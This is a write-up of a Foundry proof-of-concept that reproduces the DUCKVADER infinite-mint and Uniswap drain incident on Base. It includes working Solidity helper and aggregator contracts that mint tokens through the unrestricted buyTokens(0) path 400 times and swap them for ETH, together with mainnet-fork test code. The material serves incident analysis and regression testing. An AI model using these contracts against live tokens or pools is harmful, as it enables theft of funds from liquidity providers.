## Overview & Context

This proof-of-concept (PoC) reproduces the **Base DUCKVADER infinite mint + Uniswap drain** incident.  
On Base (chainid 8453), the DUCKVADER token exposes an unbounded `buyTokens(0)` mint path that any caller can trigger without meaningful economic cost. An adversary deploys an aggregator and many helper contracts, each of which calls `buyTokens(0)` to mint huge amounts of DUCKVADER, aggregates the tokens, and then swaps them against the DUCKVADER/WETH pool via a UniswapV2-style router, extracting ETH while depleting WETH.

The PoC is implemented as a Foundry test that:
- Forks Base mainnet at block `27445835`.
- Uses a fresh attacker EOA funded with 1 ETH.
- Deploys a local aggregator and helper contracts that mirror the incident pattern.
- Executes the infinite-mint-and-swap sequence and asserts attacker ETH profit and WETH ETH depletion.

**Command to run the PoC (from the Forge project root):**

```bash
RPC_URL="<your-Base-QuickNode-URL>" forge test --via-ir -vvvvv
```

The `RPC_URL` must point to a Base mainnet RPC that can serve block `27445835`. In the validation environment this is wired through QuickNode, but any equivalent provider that supports historical state at that height is acceptable.

---

## PoC Architecture & Key Contracts

The PoC lives in a minimal Forge project with one main test and one helper file:
- Test: `forge_poc/test/Exploit.sol`
- Helpers: `forge_poc/src/ExploitHelpers.sol`

### Roles and On-chain Components

- `attacker` – a fresh Foundry-generated EOA (`makeAddr("attacker")`) that stands in for the incident adversary.
- `duckvader_token` – canonical DUCKVADER token on Base at `0xaa8f35183478B8EcEd5619521Ac3Eb3886E98c56`.
- `weth_token` – canonical WETH on Base at `0x4200000000000000000000000000000000000006`.
- `router` – the UniswapV2-style router for the DUCKVADER/WETH pool at `0x4752ba5DBc23f44D87826276BF6Fd6b1C372aD24`.

These are the real deployed contracts from the incident; they are **not** mocked or redeployed in the test.

### Local Adversary Contracts

Two local contracts encode the attacker logic:
- `DuckvaderHelper` – minted per helper, calls `DUCKVADER.buyTokens(0)`, then forwards minted tokens to the aggregator.
- `DuckvaderAggregator` – deployed once by the attacker; calls `buyTokens(0)` once itself, then spawns many helpers and finally swaps the aggregated DUCKVADER for ETH via the router.

**Key snippet – adversary contracts (from `ExploitHelpers.sol`):**

```solidity
contract DuckvaderHelper {
    IDuckvader public immutable duckvader;
    address public immutable aggregator;

    constructor(IDuckvader _duckvader, address _aggregator) {
        duckvader = _duckvader;
        aggregator = _aggregator;
    }

    function buy() external {
        // Mint DUCKVADER via the unbounded buyTokens(0) path, then forward to aggregator.
        duckvader.buyTokens(0);
        uint256 bal = duckvader.balanceOf(address(this));
        if (bal > 0) {
            duckvader.transfer(aggregator, bal);
        }
    }
}

contract DuckvaderAggregator {
    IDuckvader public immutable duckvader;
    IWETH public immutable weth;
    IUniswapV2RouterLike public immutable router;
    address public immutable attacker;

    constructor(IDuckvader _duckvader, IWETH _weth, IUniswapV2RouterLike _router) {
        duckvader = _duckvader;
        weth = _weth;
        router = _router;
        attacker = msg.sender;
    }
```

*Caption: Local helper and aggregator contracts that exercise DUCKVADER’s unbounded `buyTokens(0)` mint path and route the resulting tokens to the attacker-controlled aggregator.*

The `attack()` function inside `DuckvaderAggregator` encodes the exploit’s core sequence.

**Key snippet – core exploit logic (from `ExploitHelpers.sol`):**

```solidity
    function attack() external {
        require(msg.sender == attacker, "only attacker");

        // The real incident invoked buyTokens(0) from the aggregator itself once,
        // then from many helpers. We mirror that pattern to reach a large mint.
        duckvader.buyTokens(0);

        // Each helper mints ~1e30 DUCKVADER once and forwards to this contract.
        // 400 helpers + one aggregator mint ≈ 4.01e32 DUCKVADER, matching the trace scale.
        uint256 helperCount = 400;
        for (uint256 i = 0; i < helperCount; i++) {
            DuckvaderHelper helper = new DuckvaderHelper(duckvader, address(this));
            helper.buy();
        }

        uint256 duckBal = duckvader.balanceOf(address(this));
        require(duckBal > 0, "no DUCKVADER balance");

        duckvader.approve(address(router), duckBal);

        address[] memory path = new address[](2);
        path[0] = address(duckvader);
        path[1] = address(weth);

        // Swap all minted DUCKVADER for ETH via the canonical router,
        // sending proceeds directly to the attacker EOA.
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            duckBal,
            0,
            path,
            attacker,
            block.timestamp + 1 days
        );
    }
```

*Caption: Aggregator attack function mirroring the incident: one aggregator mint, 400 helper mints via `buyTokens(0)`, then a DUCKVADER→WETH→ETH swap through the real router to the attacker.*

---

## Adversary Execution Flow

The main Foundry test `ExploitTest` orchestrates the full ACT sequence: funding, deployment, exploit, and profit realization.

### Environment Setup & Funding

- The test pulls `RPC_URL` from the environment and forks Base at block `27445835`:
  - Ensures the DUCKVADER token, WETH, router, and pool are in their canonical state.
- It creates a fresh EOA `attacker` and funds it with exactly 1 ETH (`vm.deal(attacker, 1 ether)`), meeting the ACT feasibility assumption.

**Snippet – setup and pre-checks (from `test/Exploit.sol`):**

```solidity
function setUp() public {
    string memory rpcUrl = vm.envString("RPC_URL");
    uint256 forkId = vm.createSelectFork(rpcUrl, 27445835);
    vm.selectFork(forkId);

    attacker = makeAddr("attacker");
    vm.deal(attacker, 1 ether);

    vm.label(attacker, "attacker");
    vm.label(address(duckvader_token), "DUCKVADER");
    vm.label(address(weth_token), "WETH");
    vm.label(address(router), "Router");

    // Pre-check oracles: chain / code / balances.
    assertEq(block.chainid, 8453);
    assertGt(address(duckvader_token).code.length, 0);
    assertGt(address(weth_token).code.length, 0);

    uint256 attackerEthBefore = attacker.balance;
    assertGe(attackerEthBefore, 1 ether);

    uint256 wethEthBefore = address(weth_token).balance;
    assertGe(wethEthBefore, 1 ether);

    vm.startPrank(attacker);
    aggregator = new DuckvaderAggregator(
        duckvader_token,
        weth_token,
        router
    );
    vm.stopPrank();
}
```

*Caption: Test setup forking Base at the incident height, funding a fresh attacker EOA, and asserting chain, code, and balance preconditions.*

### Deployment & Configuration

- The attacker deploys `DuckvaderAggregator`, passing in the canonical DUCKVADER, WETH, and router addresses.
- `DuckvaderAggregator` persists the deploying address as `attacker`, enforcing that only this EOA can invoke `attack()`.

### Exploit Steps

Within `ExploitTest.testExploit()`:

1. **Record pre-exploit state:**
   - `attackerEthBefore = attacker.balance`
   - `wethEthBefore = address(weth_token).balance`
2. **Hard oracle – unrestricted mint entrypoint:**
   - Under `vm.prank(attacker)`, call `duckvader_token.buyTokens(0)` directly from the attacker EOA.
   - This must not revert, demonstrating that `buyTokens(0)` is callable by an unprivileged address.
3. **Execute aggregator-driven exploit:**
   - Call `reproducerAttack()` which, under `vm.prank(attacker)`, invokes `aggregator.attack()`.
   - `attack()` performs one mint from the aggregator and 400 mints from new helpers, each calling `buyTokens(0)` and forwarding ~`1e30` DUCKVADER back to the aggregator before the final swap.
4. **Record post-exploit state:**
   - `attackerEthAfter = attacker.balance`
   - `wethEthAfter = address(weth_token).balance`
5. **Assert profit and victim depletion (soft oracles):**
   - `assertGt(attackerEthAfter, attackerEthBefore + 0.1 ether);`
   - `assertLt(wethEthAfter, wethEthBefore - 0.1 ether);`

**Snippet – main test flow (from `test/Exploit.sol`):**

```solidity
function testExploit() public {
    uint256 attackerEthBefore = attacker.balance;
    uint256 wethEthBefore = address(weth_token).balance;

    // Hard Oracle: DUCKVADER.buyTokens(0) callable by an unprivileged attacker.
    vm.startPrank(attacker);
    duckvader_token.buyTokens(0);
    vm.stopPrank();

    // Execute the full exploit sequence via attacker-controlled aggregator + helpers.
    reproducerAttack();

    uint256 attackerEthAfter = attacker.balance;
    uint256 wethEthAfter = address(weth_token).balance;

    // Soft Oracle: attacker profit in ETH (native).
    assertGt(attackerEthAfter, attackerEthBefore + 0.1 ether);

    // Soft Oracle: ETH depletion from WETH contract.
    assertLt(wethEthAfter, wethEthBefore - 0.1 ether);
}
```

*Caption: End-to-end exploit test that validates access to `buyTokens(0)`, executes the infinite-mint-and-swap sequence, and asserts attacker profit plus WETH ETH depletion.*

### Profit Realization & Cleanup

- The final swap sends ETH directly to the attacker EOA.
- The test does not perform any cleanup; the forked state is discarded after the test finishes. The important observable effect is the change in:
  - `attacker.balance` (positive delta > 0.1 ETH),
  - `address(weth_token).balance` (negative delta > 0.1 ETH).

---

## Oracle Definitions and Checks

This section explains how the PoC implements the specification given by `oracle_definition.json`.

### Variables

- `attacker` (role: Attacker, address: dynamic)
  - A synthetic EOA created via `makeAddr("attacker")` and funded with 1 ETH.
- `duckvader_token` (role: Token, symbol: DUCKVADER)
  - Canonical DUCKVADER token on Base at `0xaa8f35183478b8eced5619521ac3eb3886e98c56`.
- `weth_token` (role: Token, symbol: WETH)
  - Canonical WETH token on Base at `0x4200000000000000000000000000000000000006`.

### Pre-checks

1. **Chain & code presence**
   - **Spec:** Ensure Base (8453) and deployed contracts for DUCKVADER and WETH.
   - **PoC implementation:**  
     - `assertEq(block.chainid, 8453);`  
     - `assertGt(address(duckvader_token).code.length, 0);`  
     - `assertGt(address(weth_token).code.length, 0);`
   - This guarantees the test runs on Base and sees the real DUCKVADER and WETH contracts.

2. **Attacker initial ETH balance**
   - **Spec:** Attacker EOA must start with at least 1 ETH.
   - **PoC implementation:**  
     - `vm.deal(attacker, 1 ether);`  
     - `uint256 attackerEthBefore = attacker.balance; assertGe(attackerEthBefore, 1 ether);`
   - This mirrors the incident assumptions and ensures gas and seed capital.

3. **WETH ETH balance pre-exploit**
   - **Spec:** WETH contract must hold a non-trivial ETH balance (≥ 1 ETH).
   - **PoC implementation:**  
     - `uint256 wethEthBefore = address(weth_token).balance; assertGe(wethEthBefore, 1 ether);`
   - This ensures that unwrapping WETH during the swap can pay ETH out to the attacker.

### Hard Constraint

- **ID:** `hard-logic-buytokens-unprivileged-succeeds`  
- **Spec:** An unprivileged attacker must be able to call `DUCKVADER.buyTokens(0)` without revert.
- **PoC implementation:** In `testExploit()`:
  - Under `vm.startPrank(attacker)` / `vm.stopPrank()`, call `duckvader_token.buyTokens(0);`.
  - Any revert would fail the test, so a passing run certifies that this path is permissionless.

### Soft Constraints

1. **Attacker profit in ETH (`soft-attacker-profit-eth`)**
   - **Spec:** Attacker’s net ETH balance must strictly increase, with a threshold of at least `0.1` ETH.
   - **PoC implementation:**  
     - `uint256 attackerEthBefore = attacker.balance;`  
     - `reproducerAttack();`  
     - `uint256 attackerEthAfter = attacker.balance;`  
     - `assertGt(attackerEthAfter, attackerEthBefore + 0.1 ether);`
   - This captures a clearly positive ETH profit while allowing flexibility relative to the ~5.04 ETH gain in the incident.

2. **WETH ETH depletion (`soft-victim-depletion-weth-eth`)**
   - **Spec:** WETH contract’s ETH balance must strictly decrease by at least `0.1` ETH.
   - **PoC implementation:**  
     - `uint256 wethEthBefore = address(weth_token).balance;`  
     - `reproducerAttack();`  
     - `uint256 wethEthAfter = address(weth_token).balance;`  
     - `assertLt(wethEthAfter, wethEthBefore - 0.1 ether);`
   - This matches the semantic effect that WETH unwrapping funds the attacker, consistent with the incident’s ~5.04 ETH decrease in WETH.

Overall, the test’s structure directly encodes these oracles as assertions; the successful `forge test` run shows that all pre-checks, hard constraints, and soft constraints are simultaneously satisfied.

---

## Validation Result and Robustness

The validator executed the PoC with:

```bash
RPC_URL="<Base-mainnet-RPC>" forge test --via-ir -vvvvv
```

The run produced a detailed trace log and completed with:
- **Result:** `Suite result: ok. 1 passed; 0 failed; 0 skipped`
- **Validator log:** `artifacts/poc/poc_validator/forge-test.log`

The structured validation summary is recorded in:
- `artifacts/poc/poc_validator/poc_validated_result.json`

Key conclusions from that file:

- `overall_status = "Pass"` – the PoC both executes successfully and satisfies the oracle specification.
- **Correctness:**
  - All pre-checks, the hard `buyTokens(0)` oracle, and both soft oracles (attacker ETH profit and WETH ETH depletion) pass.
- **Quality:**
  - Oracle alignment: test logic closely follows the oracle definition.
  - Human-readable: contracts and actors are labeled, with comments explaining each phase.
  - No problematic magic numbers: constants (block number, helper count, thresholds) are motivated by the root cause and oracle tolerances.
  - Mainnet fork: uses `vm.createSelectFork` against Base at block `27445835` with no mocks for core components.
  - Self-contained: uses a fresh attacker EOA and locally deployed adversary contracts; no incident attacker addresses, bytecode, or calldata are replayed.
  - End-to-end flow: covers funding, deployment, exploit, and profit checks in a single test.
  - Root-cause alignment: accurately reflects the documented DUCKVADER infinite-mint + Uniswap drain behavior.

Together, these results indicate a robust PoC that is unlikely to be brittle across providers as long as a correct Base fork at block `27445835` is available.

---

## Linking PoC Behavior to Root Cause

The root-cause analysis describes an ACT-style exploit on Base:

- **A (Adversary-crafted transaction):**
  - A fresh EOA with ~1 ETH deploys an aggregator and helper contracts in a single transaction, repeatedly calling `DUCKVADER.buyTokens(0)` to mint ~`1e30` DUCKVADER per helper.
- **C (Core protocol interaction):**
  - Aggregated DUCKVADER is swapped via `UniswapV2Router02::swapExactTokensForETHSupportingFeeOnTransferTokens` against the DUCKVADER/WETH pool.
- **T (Target effect):**
  - The WETH contract’s ETH balance drops by ~5.04 ETH, while the adversary EOA’s ETH balance increases by roughly the same amount.

The PoC mirrors this structure with controlled, test-friendly components:

- **Adversary-crafted behavior in the PoC**
  - `DuckvaderAggregator` and `DuckvaderHelper` represent the incident’s aggregator and helpers.
  - The `attack()` method performs one aggregator mint and 400 helper mints via `buyTokens(0)`, matching the “many helpers minting 1e30 DUCKVADER each” pattern described in the root cause.

- **Core protocol interaction**
  - The PoC uses the real DUCKVADER token, WETH, and router addresses on a Base fork at the correct block height.
  - The swap path `[DUCKVADER, WETH]` with `swapExactTokensForETHSupportingFeeOnTransferTokens` is the same route as in the incident, ensuring that pool reserves and fees drive the outcome.

- **Target effect and oracles**
  - The exploit predicate in the root cause is “attacker profit in ETH with corresponding WETH loss.”
  - The test’s soft oracles enforce:
    - `attackerEthAfter > attackerEthBefore + 0.1 ether` (attacker profit),
    - `wethEthAfter < wethEthBefore - 0.1 ether` (WETH ETH depletion).
  - These assertions are a direct encoding of the root cause’s balance-diff evidence, with a tolerance band (0.1 ETH) to avoid overfitting to exact wei amounts.

In ACT terms:

- **A (Adversary-crafted):** `attacker` EOA deploys `DuckvaderAggregator` and triggers `attack()`, crafting the same high-level transaction structure as the incident.
- **C (Core protocol):** The PoC executes real DUCKVADER and UniswapV2Router logic on a Base fork, not local mocks, ensuring the vulnerability path is identical to mainnet.
- **T (Target effect):** The enforced oracles show that the attacker ends with more ETH and WETH ends with less ETH, demonstrating exploitable, repeatable value extraction consistent with the documented root cause.

Overall, the PoC is a faithful, self-contained reproduction of the DUCKVADER infinite-mint + Uniswap drain exploit, suitable both for regression testing and for communicating the vulnerability to human reviewers.

